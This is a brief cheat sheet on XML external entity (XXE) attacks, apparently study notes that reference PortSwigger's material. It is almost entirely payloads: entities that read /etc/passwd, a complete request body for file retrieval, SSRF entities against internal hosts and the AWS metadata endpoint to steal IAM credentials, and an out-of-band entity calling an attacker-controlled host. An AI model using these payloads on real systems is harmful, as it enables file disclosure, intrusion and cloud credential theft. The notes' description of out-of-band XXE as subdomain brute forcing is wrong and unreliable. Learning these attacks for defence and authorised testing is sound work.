XML Language and XXE Attacks

[*] XML Entities resources:
    https://portswigger.net/web-security/xxe/xml-entities

[*] XML Custom Entity
    <!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
    <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
    <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
    <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>

[*] XXE to retrieve files on host. You will need to modify the xml entities (ex. stockCheck/productId)
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>

[*] XXE to request services from the backend, server side request forgery (SSRF). Example would
    be to bypass the front end proxy and request information from the backend services, revealing 
    information from those hosts.
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
    Example to steal IAM secret from AWS:
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>

[*] Out-of-Band (OAST) XXE is basically brute forcing subdomains through SSRF:
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
    